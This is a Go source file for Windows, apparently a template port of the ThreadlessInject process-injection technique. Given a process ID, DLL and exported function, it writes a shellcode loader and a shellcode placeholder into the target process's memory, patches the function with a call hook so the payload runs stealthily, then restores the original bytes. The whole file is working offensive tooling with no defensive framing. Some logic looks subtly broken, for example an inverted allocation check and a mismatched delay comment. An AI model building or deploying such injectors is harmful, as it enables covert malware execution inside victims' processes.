// +build windows

// Original repository : https://github.com/CCob/ThreadlessInject

package main

import (
	"flag"
	"time"
	"fmt"
	"log"
	"unsafe"
	"encoding/binary"
	"bytes"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
	VirtualFreeEx = kernel32.NewProc("VirtualFreeEx")
	VirtualProtectEx = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	ReadProcessMemory = kernel32.NewProc("ReadProcessMemory")
	CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")


	oldProtect = windows.PAGE_READWRITE
	callOpCode = []byte{ 0xe8, 0, 0, 0, 0 };
	uintsize = unsafe.Sizeof(uintptr(0))

	// calc
        SHELLCODE_REPLACE
		
	shellcodeLoader = []byte{
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90,
	}

	payload = append(shellcodeLoader, shellcode...)
	payloadSize = len(payload)
)

func GenerateHook(originalBytes []byte) {
	// Overwrite dummy 0x887766.. instructions in loader to restore original bytes of the hooked function
	for i := 0; i < len(originalBytes); i++ {
		// shellcodeLoader[0x12 + i] = originalBytes[i]
		payload[0x12 + i] = originalBytes[i]
	}
	// fmt.Printf("[+] DEBUG - Loader : %x\n", payload)
}

func FindMemoryHole(pHandle , exportAddress, size uintptr) (uintptr, error) {
	remoteLoaderAddress := uintptr(0)
	errVirtualAlloc := error(nil)

	for remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress + 0x70000000; remoteLoaderAddress += 0x10000 {
		fmt.Printf("[+] Trying address : @%x\n", remoteLoaderAddress)
		_, _, errVirtualAlloc = VirtualAllocEx.Call(
			uintptr(pHandle),
			remoteLoaderAddress,
			uintptr(size),
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)
		fmt.Printf("%s\n", errVirtualAlloc.Error())
		if errVirtualAlloc !=  nil && errVirtualAlloc.Error() != "The operation completed successfully." {
			fmt.Printf("[+] Successfully allocated : @%x\n", remoteLoaderAddress)
			break
		}
	}


	return remoteLoaderAddress, nil
}

func main() {
	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	function := flag.String("fct", "", "Remote function to hook")
	dll := flag.String("dll", "", "DLL in which the remote function is located")
	flag.Parse()

	// Get handle to remote process
	pHandle, errOpenProcess := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, 
		uint32(*pid))

	if errOpenProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess : %s\r\n", errOpenProcess.Error()))
	}

	// Get address of remote function to hook (GetModuleHandle + LoadLibrary under the hood)
	DLL := windows.NewLazySystemDLL(*dll)
	remote_fct := DLL.NewProc(*function)
	exportAddress := remote_fct.Addr()

	fmt.Printf("[+] DEBUG - Export address: %x\n", exportAddress)
	
	loaderAddress, holeErr := FindMemoryHole(uintptr(pHandle), exportAddress, uintptr(payloadSize))
	if holeErr != nil {
		log.Fatal(fmt.Sprintf("[!]Error finding memory hole : %s\r\n", holeErr.Error()))
	}

	var originalBytes []byte = make([]byte, 8)
	// Read original bytes of the remote function
	ReadProcessMemory.Call(
		uintptr(pHandle), 
		exportAddress, 
		uintptr(unsafe.Pointer(&originalBytes[0])), 
		uintptr(len(originalBytes)))

	fmt.Printf("[+] DEBUG - Original bytes: 0x%x\n", originalBytes)
	
	// Write function original bytes to loader, so it can restore after one-time execution
	GenerateHook(originalBytes)

	// Unprotect remote function memory
	VirtualProtectEx.Call(
		uintptr(pHandle), 
		exportAddress, 
		8,
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)))
	
	var relativeLoaderAddress = (uint32)((uint64)(loaderAddress) - ((uint64)(exportAddress) + 5));
	relativeLoaderAddressArray := make([]byte, uintsize)
	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)
	fmt.Printf("[+] DEBUG - Relative loader address: %x\n", relativeLoaderAddress)

	callOpCode[1] = relativeLoaderAddressArray[0]
	callOpCode[2] = relativeLoaderAddressArray[1]
	callOpCode[3] = relativeLoaderAddressArray[2]
	callOpCode[4] = relativeLoaderAddressArray[3]
	
	fmt.Printf("[+] DEBUG - callOpCode : 0x%x\n", callOpCode)

	// Hook the remote function
	WriteProcessMemory.Call(
		uintptr(pHandle), 
		exportAddress, 
		(uintptr)(unsafe.Pointer(&callOpCode[0])), 
		uintptr(len(callOpCode)))


	newBytes := make([]byte, uintsize)
	binary.LittleEndian.PutUint64(newBytes, uint64(exportAddress))
	fmt.Printf("[+] DEBUG - newBytes : %x\n", newBytes)

	// Unprotect loader allocated memory
	VirtualProtectEx.Call(
		uintptr(pHandle), 
		loaderAddress, 
		uintptr(payloadSize), 
		windows.PAGE_READWRITE, 
		uintptr(unsafe.Pointer(&oldProtect)))

	// Write loader to allocated memory
	WriteProcessMemory.Call(
		uintptr(pHandle), 
		loaderAddress, 
		(uintptr)(unsafe.Pointer(&payload[0])), 
		uintptr(payloadSize))

	// Protect loader allocated memory
	VirtualProtectEx.Call(
		uintptr(pHandle), 
		loaderAddress, 
		uintptr(payloadSize), 
		windows.PAGE_EXECUTE_READ, 
		uintptr(unsafe.Pointer(&oldProtect)))

	fmt.Println("[+] Shellcode injected, waiting 60s for the hook to be called...")

	delay := 10 * time.Second
	var endTime <- chan time.Time
	endTime = time.After(delay)

	executed := false
	for {
		select {
		case <- endTime:
			fmt.Println("[+] Done")
			return
		default:
			read := 0
			var buf []byte = make([]byte, 8)
			
			ReadProcessMemory.Call(
				uintptr(pHandle), 
				exportAddress, 
				uintptr(unsafe.Pointer(&buf[0])), 
				uintptr(len(buf)), 
				uintptr(unsafe.Pointer(&read)))
			fmt.Println("[+] Monitoring...")
			fmt.Printf("[+] Read bytes: %x\n", buf)
			fmt.Printf("[+] Original bytes: %x\n", originalBytes)

			if bytes.Equal(buf, originalBytes) {
				fmt.Println("[+] Hook called")
				executed = true
				break
			}
			
			time.Sleep(1 * time.Second)
			continue
		}

		if executed {
			break
		}
	}

	if executed {
		fmt.Println("[+] Cleaning up")

		VirtualProtectEx.Call(
			uintptr(pHandle), 
			exportAddress, 
			8, 
			windows.PAGE_EXECUTE_READ, 
			uintptr(unsafe.Pointer(&oldProtect)))

		VirtualFreeEx.Call(
			uintptr(pHandle), 
			loaderAddress, 
			0, 
			windows.MEM_RELEASE)

	}

	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:%s\r\n", errCloseHandle.Error()))
	}

}

